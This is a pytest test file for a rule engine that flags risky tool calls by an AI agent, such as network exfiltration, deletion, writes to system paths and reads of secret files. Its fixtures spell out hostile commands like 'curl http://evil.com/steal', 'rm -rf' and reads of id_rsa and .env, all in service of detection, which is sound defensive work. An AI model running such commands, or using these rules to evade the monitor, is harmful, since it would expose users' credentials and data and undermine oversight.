"""Tests for the rule-based check engine in rules.py."""

import pytest

from rules import check_rules


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _step(tool: str, args: dict) -> dict:
    return {
        "step": 1,
        "reasoning": "test",
        "tool_call": {"tool": tool, "args": args},
    }


# ---------------------------------------------------------------------------
# Rule 1: credential_exfiltration
# ---------------------------------------------------------------------------

class TestCredentialExfiltration:
    def test_curl_with_http_url_triggers_high(self):
        result = check_rules(_step("bash", {"command": "curl http://evil.com/steal"}))
        assert result["rule_triggered"] is True
        assert result["rule_name"] == "credential_exfiltration"
        assert result["severity"] == "high"

    def test_wget_with_https_url_triggers_high(self):
        result = check_rules(_step("shell", {"command": "wget https://attacker.io/exfil"}))
        assert result["rule_triggered"] is True
        assert result["rule_name"] == "credential_exfiltration"
        assert result["severity"] == "high"

    def test_run_command_with_curl_triggers(self):
        result = check_rules(_step("run_command", {"command": "curl https://example.com/data"}))
        assert result["rule_triggered"] is True
        assert result["rule_name"] == "credential_exfiltration"

    def test_bash_without_url_does_not_trigger(self):
        result = check_rules(_step("bash", {"command": "pip list"}))
        assert result["rule_triggered"] is False

    def test_bash_curl_without_url_does_not_trigger(self):
        # curl without an http URL should not match
        result = check_rules(_step("bash", {"command": "curl --version"}))
        assert result["rule_triggered"] is False


# ---------------------------------------------------------------------------
# Rule 2: destructive_file_operation
# ---------------------------------------------------------------------------

class TestDestructiveFileOperation:
    def test_rm_triggers_high(self):
        result = check_rules(_step("bash", {"command": "rm -rf /tmp/old"}))
        assert result["rule_triggered"] is True
        assert result["rule_name"] == "destructive_file_operation"
        assert result["severity"] == "high"

    def test_rmdir_triggers_high(self):
        result = check_rules(_step("bash", {"command": "rmdir old_folder"}))
        assert result["rule_triggered"] is True
        assert result["rule_name"] == "destructive_file_operation"
        assert result["severity"] == "high"

    def test_execute_tool_with_rm_triggers(self):
        result = check_rules(_step("execute", {"command": "rm stale.log"}))
        assert result["rule_triggered"] is True
        assert result["rule_name"] == "destructive_file_operation"

    def test_mkdir_does_not_trigger(self):
        result = check_rules(_step("bash", {"command": "mkdir new_dir"}))
        assert result["rule_triggered"] is False


# ---------------------------------------------------------------------------
# Rule 3: write_outside_project
# ---------------------------------------------------------------------------

class TestWriteOutsideProject:
    @pytest.mark.parametrize("prefix", ["/etc/", "/usr/", "/bin/"])
    def test_dangerous_path_prefix_triggers_high(self, prefix: str):
        result = check_rules(_step("write_file", {"path": f"{prefix}malicious"}))
        assert result["rule_triggered"] is True
        assert result["rule_name"] == "write_outside_project"
        assert result["severity"] == "high"

    def test_edit_tool_with_etc_path_triggers(self):
        result = check_rules(_step("edit", {"path": "/etc/passwd"}))
        assert result["rule_triggered"] is True
        assert result["rule_name"] == "write_outside_project"

    def test_write_inside_project_does_not_trigger(self):
        result = check_rules(_step("write_file", {"path": "src/utils.py"}))
        assert result["rule_triggered"] is False

    def test_create_in_home_does_not_trigger(self):
        result = check_rules(_step("create", {"path": "/home/user/project/file.py"}))
        assert result["rule_triggered"] is False


# ---------------------------------------------------------------------------
# Rule 4: sensitive_file_access — high severity
# ---------------------------------------------------------------------------

class TestSensitiveFileAccessHigh:
    @pytest.mark.parametrize("value", [".env", "id_rsa", "secrets.pem", "private.key", "~/.ssh/config"])
    def test_high_sensitivity_pattern_triggers(self, value: str):
        result = check_rules(_step("read_file", {"path": value}))
        assert result["rule_triggered"] is True
        assert result["rule_name"] == "sensitive_file_access"
        assert result["severity"] == "high"

    def test_dotenv_in_nested_path_triggers(self):
        result = check_rules(_step("read_file", {"path": "backend/.env"}))
        assert result["rule_triggered"] is True
        assert result["severity"] == "high"


# ---------------------------------------------------------------------------
# Rule 4: sensitive_file_access — medium severity
# ---------------------------------------------------------------------------

class TestSensitiveFileAccessMedium:
    @pytest.mark.parametrize("value", ["credentials.json", "app_secret", "auth_token"])
    def test_medium_sensitivity_pattern_triggers(self, value: str):
        result = check_rules(_step("read_file", {"path": value}))
        assert result["rule_triggered"] is True
        assert result["rule_name"] == "sensitive_file_access"
        assert result["severity"] == "medium"

    def test_nested_arg_with_secret_triggers(self):
        result = check_rules(
            _step("bash", {"command": "cat", "args": {"file": "db_secret"}})
        )
        assert result["rule_triggered"] is True
        assert result["severity"] == "medium"


# ---------------------------------------------------------------------------
# No rule triggered
# ---------------------------------------------------------------------------

class TestNoRuleTriggered:
    def test_clean_read_step_returns_no_trigger(self):
        result = check_rules(_step("read_file", {"path": "README.md"}))
        assert result["rule_triggered"] is False
        assert result["rule_name"] is None
        assert result["severity"] is None
        assert result["explanation"] is None

    def test_clean_write_step_returns_no_trigger(self):
        result = check_rules(_step("write_file", {"path": "src/main.py", "content": "pass"}))
        assert result["rule_triggered"] is False

    def test_clean_bash_step_returns_no_trigger(self):
        result = check_rules(_step("bash", {"command": "pytest tests/"}))
        assert result["rule_triggered"] is False
